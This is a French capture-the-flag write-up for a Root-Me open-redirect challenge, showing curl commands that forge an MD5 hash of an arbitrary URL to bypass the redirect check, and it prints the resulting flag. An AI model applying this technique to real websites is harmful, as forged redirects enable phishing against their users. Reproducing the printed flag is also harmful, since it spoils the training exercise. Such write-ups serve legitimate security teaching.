# Challenge 3 — HTTP - Open Redirect

## Niveau

Niveau 1 : Très facile - 10 points

## Énoncé

Trouvez un moyen de faire une redirection vers un domaine autre que ceux proposés sur la page web.

## Explication

En inspectant le HTML, on remarque des liens du type :

```html
<a href='?url=https://facebook.com&h=a023cfbf5f1c39bdf8407f28b60cd134'>facebook</a>
```

On soupçonne que le paramètre `h` est la valeur MD5 de l'URL fournie.

## Vérification

```bash
curl -s http://challenge01.root-me.org/web-serveur/ch52/ | grep 'href='
```

## Exploitation

On calcule le hash MD5 d'un site différent :

```bash
printf '%s' 'https://pornhub.com' | md5sum
```

Ensuite on injecte le bon hash dans la requête :

```bash
curl -i 'http://challenge01.root-me.org/web-serveur/ch52/?url=https://pornhub.com&h=d074634084a1556083fcd17c0254b557' | grep 'flag'
```

## Résultat

Le serveur valide le hash et affiche le flag.

```text
<p>Well done, the flag is e6f8a530811d5a479812d7b82fc1a5c5</p>
```